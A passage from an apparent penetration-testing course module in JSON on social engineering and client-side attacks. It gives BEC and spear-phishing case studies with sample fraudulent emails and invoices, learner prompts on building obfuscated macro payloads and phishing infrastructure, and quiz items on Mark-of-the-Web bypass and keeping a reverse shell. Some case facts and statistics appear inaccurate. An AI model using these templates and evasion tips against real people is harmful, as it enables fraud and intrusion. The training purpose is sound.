Fake Vendor (2013-2015)**\n\n**Impact:** $121 million stolen from Google and Facebook\n\n**Attack vector:** Business Email Compromise (BEC) with fake invoices\n\n**How it worked:**\n```\n1. Attacker created fake company: \"Quanta Computer\" (real vendor to Google/Facebook)\n2. Registered similar company in Latvia: \"Quanta Computer Inc.\"\n3. Opened bank accounts in Latvia and Cyprus\n4. Created fake invoices with Quanta letterhead\n5. Sent invoices to Google/Facebook accounts payable departments\n6. Invoices looked legitimate (correct format, realistic amounts)\n7. Google/Facebook wire transferred payments to attacker's accounts\n8. Attacker moved money through multiple countries\n9. Scheme ran for 2+ years before detection\n```\n\n**Example fake invoice:**\n```\nQUANTA COMPUTER INC.\nInvoice #QC-2014-08754\n\nBill To: Google LLC\n        Accounts Payable\n        1600 Amphitheatre Parkway\n        Mountain View, CA 94043\n\nDescription: Server Components - Q2 2014\nAmount: $1,847,250.00\n\nWire transfer details:\nBank: [Latvia bank]\nAccount: LV89HABA0551[...]\nSWIFT: HABALV22\n\nPayment due: 30 days\n```\n\n**Social engineering elements:**\n```\n- Used real vendor name (Quanta Computer = actual Google/Facebook supplier)\n- Invoices matched expected format/amounts\n- Exploited high-volume payment processing (harder to verify each one)\n- Sent emails from similar domain: quanta-computer.com vs quantacomputer.com\n- Timing: Sent invoices during end-of-quarter (busy finance period)\n```\n\n**Lessons learned:**\n- Verify payment details through separate channel (call known number, don't reply to email)\n- Vendor verification process needed for bank account changes\n- Even tech giants fall victim to simple social engineering\n- Low-tech attack (fake invoices) > high-tech defenses\n\n### **Case Study 4: RSA SecurID Breach via Spear-Phishing (2011)**\n\n**Impact:** SecurID token seeds stolen, affecting millions of users\n\n**Attack vector:** Targeted spear-phishing email\n\n**Email details:**\n```\nSubject: 2011 Recruitment Plan\n\nFrom: webmaster@rsa.com [SPOOFED]\n\nTo: rsaemployees@rsa.com [Internal mailing list]\n\nHi Team,\n\nAttached is the recruitment plan for 2011 as discussed in last week's meeting.\n\nPlease review and provide feedback by Friday.\n\nThanks,\nHR Department\n\nAttachment: 2011_Recruitment_plan.xls [Excel macro malware]\n```\n\n**Attack flow:**\n```\n1. RSA employee opens attachment\n2. Excel macro executes (Poison Ivy RAT)\n3. Attacker gains foothold on corporate network\n4. Lateral movement over several weeks\n5. Escalate to administrator privileges\n6. Locate and exfiltrate SecurID seed database\n7. Result: All SecurID tokens potentially compromised\n```\n\n**Impact:**\n```\n- RSA forced to replace 40+ million SecurID tokens\n- Cost: $66 million\n- Lockheed Martin, Northrop Grumman (RSA customers) subsequently attacked\n- U.S. Department of Defense systems at risk\n- Reputation damage to \"security leader\"\n```\n\n**Lessons learned:**\n- Security companies are prime targets (high-value data)\n- One successful phishing email can compromise entire organization\n- Macro-enabled documents = high-risk attack vector\n- Network segmentation critical (employee network ≠ sensitive data network)\n\n### **Case Study 5: Ubiquiti Networks - CEO Fraud (2015)**\n\n**Impact:** $46.7 million stolen via wire transfer\n\n**Attack vector:** Business Email Compromise (BEC) - CEO impersonation\n\n**Attack details:**\n```\nEmail to Finance Department:\n\nFrom: \"CEO\" <ceo@ubiquitinetworks.com> [SPOOFED]\nSubject: CONFIDENTIAL - Acquisition\n\nI'm working with outside counsel on a confidential acquisition.\nPlease process the following wire transfers:\n\nRecipient: [Attacker's account in Hong Kong]\nAmount: $8,100,000 (first transfer)\n\nDo NOT discuss this with anyone - highly confidential until deal closes.\n\nMore transfers will follow.\n\nRegards,\n[CEO Name]\n```\n\n**Why it worked:**\n```\n- Authority: Appeared to come from CEO\n- Urgency: Acquisition timeline pressure\n- Secrecy: \"Don't tell anyone\" prevented verification\n- Legitimacy: Acquisitions involve large wire transfers\n- Multiple transfers: $46.7M total across several transactions\n```\n\n**Recovery:**\n```\n- Ubiquiti discovered fraud within 1 week\n- Worked with FBI and international law enforcement\n- Recovered $8.1 million (only 17% of stolen amount)\n- Remaining $38.6 million lost permanently\n```\n\n**Lessons learned:**\n- Verify ALL wire transfer requests through separate channel\n- Dual authorization required for large transfers\n- \"CEO says don't verify\" = RED FLAG\n- BEC attacks target finance departments specifically\n\n### **Industry Statistics (2023):**\n\n- **91%** of cyberattacks begin with phishing (Proofpoint)\n- **Average phishing click rate:** 32% (KnowBe4)\n- **BEC losses:** $2.7 billion in 2022 (FBI IC3)\n- **CEO fraud success rate:** 68% (Barracuda)\n- **Average social engineering training reduces clicks:** From 32% to 8% (KnowBe4)\n- **Vishing attack increase:** 550% since 2020 (Agari)"
      }
    },
    {
      "block_id": "d4e5f6a7-b8c9-4d0e-1f2a-3b4c5d6e7f91",
      "type": "reflection",
      "content": {
        "text": "## Self-Assessment: Client-Side Attacks & Social Engineering\n\n**1. Technical Skills**\n\nRate your confidence (1-5):\n- [ ] Creating malicious Office macros - _____/5\n- [ ] Generating HTA payloads - _____/5\n- [ ] Crafting ISO/IMG containers - _____/5\n- [ ] Building LNK-based attacks - _____/5\n- [ ] Setting up phishing infrastructure - _____/5\n\n**What client-side attack vector do you find most effective? Why?**\n\n**Which technique would you use if Office macros are blocked?**\n\n**2. Social Engineering Principles**\n\nRate your understanding (1-5):\n- [ ] Authority principle - _____/5\n- [ ] Urgency/Scarcity - _____/5\n- [ ] Social proof - _____/5\n- [ ] Reciprocity - _____/5\n- [ ] Building rapport - _____/5\n\n**Describe a scenario where you would use the authority principle:**\n\n**How would you create urgency in a phishing email without being obvious?**\n\n**3. Pretexting Skills**\n\nRate your confidence (1-5):\n- [ ] IT help desk pretexting - _____/5\n- [ ] Vendor/supplier impersonation - _____/5\n- [ ] HR/Finance pretexting - _____/5\n- [ ] Vishing (voice phishing) - _____/5\n- [ ] Physical tailgating - _____/5\n\n**Create a brief pretext for calling a company's help desk to gather information:**\n\n**What information would you gather before attempting a CEO fraud attack?**\n\n**4. Phishing Campaign Design**\n\nRate your confidence (1-5):\n- [ ] Domain registration and SSL setup - _____/5\n- [ ] Email spoofing and bypassing spam filters - _____/5\n- [ ] Credential harvesting page creation - _____/5\n- [ ] Payload delivery and C2 setup - _____/5\n- [ ] Campaign tracking and metrics - _____/5\n\n**What makes a phishing email convincing?**\n\n**How would you test phishing emails before launching a campaign?**\n\n**5. Ethical Considerations**\n\n**CRITICAL QUESTIONS:**\n\n**How do you ensure you stay within scope during social engineering engagements?**\n\n**What do you do if a social engineering attempt causes emotional distress to the target?**\n\n**How do you handle sensitive information obtained during pretexting?**\n\n**When would you stop a social engineering attack even if it's working?**\n\n**How do you balance effectiveness with ethics in social engineering?**\n\n**6. Real-World Application**\n\n**Scenario 1:** You're conducting an authorized pentest. Design a complete phishing campaign:\n- Target: Finance department (30 employees)\n- Goal: Credential harvesting\n- Constraints: No macro attacks (Office blocks them)\n\n**Your approach:**\n\n**Scenario 2:** During a physical pentest, you need to access a secure area. The door requires badge access. What are three methods you could try?\n\n**Scenario 3:** You've sent 50 phishing emails. 15 people clicked, 3 entered credentials. How do you proceed with the engagement?\n\n**7. Red Flags and Detection**\n\n**What red flags should organizations train employees to recognize?**\n\n**How can you make your phishing emails more realistic to evade detection?**\n\n**What indicators might reveal a social engineering attack in progress?**\n\n**8. Action Plan**\n\n**Skills to practice:**\n1. \n2. \n3. \n\n**Tools to master:**\n- [ ] Social Engineering Toolkit (SET)\n- [ ] Gophish (phishing framework)\n- [ ] EvilGinx2 (phishing with 2FA bypass)\n- [ ] Office macro generators\n- [ ] Email header analysis tools\n\n**Practice exercises:**\n1. Create 3 different macro payloads with obfuscation\n2. Build complete phishing infrastructure (domain, SSL, landing page)\n3. Write 5 pretexting scripts for different scenarios\n4. Practice vishing on authorized VM lab\n5. Study real-world BEC cases and identify techniques\n\n**Reading/Research:**\n- [ ] \"The Art of Deception\" by Kevin Mitnick\n- [ ] \"Social Engineering: The Science of Human Hacking\" by Christopher Hadnagy\n- [ ] SANS SEC542 (Web App Penetration Testing)\n- [ ] Real-world BEC case studies (FBI IC3 reports)\n- [ ] Phishing simulation vendor reports (KnowBe4, Cofense)\n\n**Remember:** Social engineering is incredibly powerful and can cause real harm. ALWAYS:\n- Get written authorization before any social engineering\n- Stay within defined scope\n- Stop if causing emotional distress\n- Handle obtained data responsibly\n- Report findings professionally and compassionately\n- Help organizations improve through awareness training\n\nThe goal is to make organizations MORE secure, not to embarrass employees who fall victim. Everyone is susceptible to social engineering - even security professionals!"
      }
    }
  ],
  "post_assessment": [
    {
      "question": "You're creating a malicious Word document for an authorized penetration test. The target organization blocks macros from internet downloads. Which approach is most likely to succeed?",
      "options": [
        "Embed macro in .docm file and compress it in a ZIP archive",
        "Create ISO file containing .docm document to bypass Mark-of-the-Web",
        "Convert macro to DDE (Dynamic Data Exchange) formula field",
        "Encode macro in base64 to bypass detection"
      ],
      "correct_answer": 1,
      "explanation": "Option B is correct: ISO files bypass Mark-of-the-Web (MOTW) protections. Files inside the ISO don't inherit MOTW, so macros run without warnings. Option A (ZIP) doesn't bypass MOTW. Option C (DDE) is deprecated and blocked in modern Office. Option D (base64) doesn't address the MOTW block.",
      "question_id": "a55234f7-3d5a-4dd0-832b-108592162bcc",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "During a social engineering engagement, you're impersonating IT support to gather credentials. Which psychological principle makes this approach most effective?",
      "options": [
        "Social proof - Everyone else in IT does this",
        "Authority - IT support has legitimate access needs",
        "Reciprocity - You're helping them fix a problem",
        "Scarcity - Limited time to resolve the issue"
      ],
      "correct_answer": 1,
      "explanation": "Authority is the primary principle: people trust and obey IT support because they're seen as legitimate authority figures with technical expertise. While urgency (option D) often enhances the attack, authority is the foundational principle that makes IT impersonation effective. Options A and C are less relevant in IT support scenarios.",
      "question_id": "58cd007a-f81e-4f01-a7b8-49137e01616f",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "You're designing a phishing campaign targeting a company's finance department. Which pretext is statistically most likely to achieve high click rates?",
      "options": [
        "Generic lottery winnings notification",
        "CEO requesting urgent wire transfer (BEC)",
        "IT security requiring password update",
        "Shipping notification from FedEx/UPS"
      ],
      "correct_answer": 1,
      "explanation": "CEO fraud / Business Email Compromise (BEC) has the highest success rate (68% according to Barracuda) because it combines authority (CEO), urgency (wire transfer deadline), and relevance to finance roles. Option A is generic spam (low success). Option C works but is overused (employees are trained to recognize). Option D has moderate success but is less targeted.",
      "question_id": "ec4ca2e6-72f3-4e6a-a054-4325dbeba96b",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "An employee receives this email: 'Your Office365 account will be suspended in 2 hours due to suspicious activity. Click here to verify: https://office365-secure.com/login'. What are the TWO biggest red flags?",
      "options": [
        "The domain is office365-secure.com (not microsoft.com) AND creates urgency (2 hours)",
        "It requests clicking a link AND mentions account suspension",
        "It uses HTTPS (padlock icon) AND has poor grammar",
        "It came from external sender AND mentions Office365"
      ],
      "correct_answer": 0,
      "explanation": "Option A identifies the two critical red flags: (1) Domain is not microsoft.com/office.com - it's a typosquatting domain designed to look legitimate, and (2) Urgency ('2 hours') is a classic social engineering tactic to prevent careful analysis. Option B describes symptoms but not root causes. Option C is wrong (HTTPS doesn't indicate legitimacy). Option D is too generic.",
      "question_id": "e4452c71-690e-49b6-8c22-04441d214916",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "You've successfully deployed a malicious HTA file and received a reverse shell. The target asks if they can close the 'update window'. What is the most appropriate ethical response?",
      "options": [
        "Tell them yes, and continue exploitation from the established shell",
        "Tell them no, you need to complete additional testing first",
        "Immediately terminate the connection and document the success",
        "Ignore the question and continue with post-exploitation"
      ],
      "correct_answer": 0,
      "explanation": "Option A is correct: You can allow them to close the HTA window (it already executed the payload) while maintaining your established shell for authorized testing. Option B is suspicious and may blow your cover. Option C terminates valid testing prematurely (you have authorization to continue). Option D is unprofessional and rude. Remember: be courteous and professional while maintaining operational security.",
      "question_id": "fad0cda8-7f1a-499f-830d-082872bbd113",
      "type": "multiple_choice",
      "difficulty": 2
    }
  ]
}